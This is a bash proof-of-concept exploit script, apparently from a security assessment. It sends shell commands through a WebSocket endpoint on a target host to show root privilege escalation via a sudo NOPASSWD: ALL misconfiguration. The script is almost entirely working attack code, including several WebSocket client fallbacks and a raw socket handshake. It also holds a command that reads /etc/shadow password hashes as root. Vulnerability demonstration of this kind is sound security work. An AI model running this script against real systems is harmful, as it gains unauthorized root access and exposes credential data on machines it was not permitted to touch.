#!/bin/bash

# POC: Privilege Escalation via Sudo NOPASSWD: ALL
# This script demonstrates the privilege escalation vulnerability where
# the WebSocket-accessible user has unrestricted sudo access.

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8080}"
WS_URL="ws://$TARGET_HOST:$TARGET_PORT/ws"

echo "[*] Privilege Escalation POC via Sudo NOPASSWD: ALL"
echo "[*] Target: $WS_URL"
echo ""

# Check if wscat is available, if not install or use curl as fallback
if ! command -v websocat &> /dev/null && ! command -v wscat &> /dev/null; then
    echo "[!] Installing websocat for WebSocket testing..."
    if command -v cargo &> /dev/null; then
        cargo install websocat 2>/dev/null
    else
        echo "[!] websocat not available. Attempting to use curl with WebSocket support..."
    fi
fi

# Function to send WebSocket commands
send_ws_command() {
    local command="$1"
    echo "[*] Sending command: $command"
    
    # Try with websocat if available
    if command -v websocat &> /dev/null; then
        echo "$command" | timeout 5 websocat "$WS_URL" 2>/dev/null
    # Try with wscat if available
    elif command -v wscat &> /dev/null; then
        (echo "$command"; sleep 1) | timeout 5 wscat -c "$WS_URL" 2>/dev/null
    # Fallback: attempt connection with Python if available
    elif command -v python3 &> /dev/null; then
        python3 << PYTHON_EOF
import sys
import socket
import base64
import hashlib
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(('$TARGET_HOST', $TARGET_PORT))
    
    # Send basic HTTP upgrade request
    upgrade_request = (
        "GET /ws HTTP/1.1\r\n"
        "Host: $TARGET_HOST:$TARGET_PORT\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    sock.send(upgrade_request.encode())
    response = sock.recv(4096)
    
    # Send command (simplified WebSocket frame - may need adjustment based on server)
    command = "$command\n"
    sock.send(command.encode())
    
    # Receive response
    output = sock.recv(4096).decode(errors='ignore')
    print(output)
    sock.close()
except Exception as e:
    print(f"[!] Error: {e}", file=sys.stderr)
PYTHON_EOF
    else
        echo "[!] No WebSocket tools available. Using curl as fallback..."
        curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
             -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
             -H "Sec-WebSocket-Version: 13" \
             "http://$TARGET_HOST:$TARGET_PORT/ws" 2>&1 | head -20
    fi
}

echo "[*] Testing WebSocket connection and privilege escalation..."
echo ""

# Test 1: Verify user identity
echo "[+] TEST 1: Verify current user"
send_ws_command "whoami"
echo ""

# Test 2: Check sudo privileges
echo "[+] TEST 2: Check sudo access (without password prompt)"
send_ws_command "sudo -l"
echo ""

# Test 3: Escalate to root with sudo
echo "[+] TEST 3: Execute command as root via sudo"
send_ws_command "sudo whoami"
echo ""

# Test 4: Confirm root access by reading /etc/shadow (root-only file)
echo "[+] TEST 4: Access root-only files (privilege escalation confirmation)"
send_ws_command "sudo cat /etc/shadow | head -3"
echo ""

# Test 5: Show system information with root privileges
echo "[+] TEST 5: Execute privileged command (id as root)"
send_ws_command "sudo id"
echo ""

echo "[*] POC Complete"
echo "[!] If any command returned 'root' or displayed root-level access, the vulnerability is confirmed."